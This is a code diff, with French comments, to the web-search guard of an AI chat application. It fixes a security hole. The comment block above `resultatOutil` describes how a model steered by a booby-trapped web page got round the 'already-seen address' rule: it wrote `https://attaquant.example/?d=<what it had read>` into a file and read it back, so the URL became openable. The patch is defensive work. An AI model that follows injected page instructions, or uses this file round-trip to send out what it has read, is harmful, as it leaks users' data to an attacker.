@@ -115,9 +115,35 @@ export class RechercheWeb {
     return [...this.sources.values()].sort((a, b) => a.n - b.n);
   }
 
-  /** Le résultat d'un autre outil (un fichier, un mail) : ses adresses deviennent ouvrables, pas celles que le modèle a mises dans sa demande. */
-  noter(texte: string, demande: string): void {
-    webGarde.noterVues(this.cle, texte, demande);
+  /** Tout ce que le modèle a mis dans ses demandes d'outils pendant cette demande. */
+  private demandes: string[] = [];
+  /** Le modèle a fait écrire quelque chose pendant cette demande (un fichier, un document, une note…). */
+  private aEcrit = false;
+
+  /**
+   * Le résultat d'un outil autre que le web, dans une demande avec la
+   * recherche sur le web (chat.ts).
+   *
+   * Tournée finale de la 2026.928.6 (SECURITE.md § 53) : chaque résultat
+   * rendait ses adresses ouvrables, sauf celles de la demande en cours. Avec
+   * « Outils » aussi actif, un modèle guidé par une page piégée écrivait
+   * `https://attaquant.example/?d=<ce qu'il avait lu>` dans un fichier (sans
+   * carte au niveau « Tout approuver »), le relisait, et l'adresse, « vue »
+   * dans le résultat de la lecture, s'ouvrait : ce que ferme la règle « une
+   * adresse déjà vue » revenait par un aller-retour dans un fichier.
+   *
+   * Désormais : aucune adresse n'est plus relevée dans un résultat d'outil
+   * une fois que le modèle a fait écrire quoi que ce soit (`modifie`, la
+   * barrière), ni dans le résultat de l'écriture elle-même ; et une adresse
+   * que le modèle a écrite dans n'importe laquelle de ses demandes ne
+   * devient jamais ouvrable. Les adresses des pages et des résultats de
+   * recherche restent relevées, comme celles des lectures faites avant.
+   */
+  resultatOutil(modifie: boolean, contenu: string | null, demande: string): void {
+    this.demandes.push(demande);
+    if (modifie) this.aEcrit = true;
+    if (this.aEcrit || contenu === null) return;
+    webGarde.noterVues(this.cle, contenu, this.demandes.join("\n"));
   }
 
   private numero(adresse: string, titre: string, lue: boolean): SourceWeb {
@@ -196,6 +222,8 @@ export class RechercheWeb {
   }
 
   async appeler(nom: string, args: Record<string, unknown>): Promise<{ ok: boolean; content: string }> {
+    // Ce que le modèle demande au web compte aussi parmi ses demandes (`resultatOutil`).
+    this.demandes.push(JSON.stringify(args));
     try {
       if (nom === "web__chercher") {
         if (this.recherches >= RECHERCHES_MAX) {
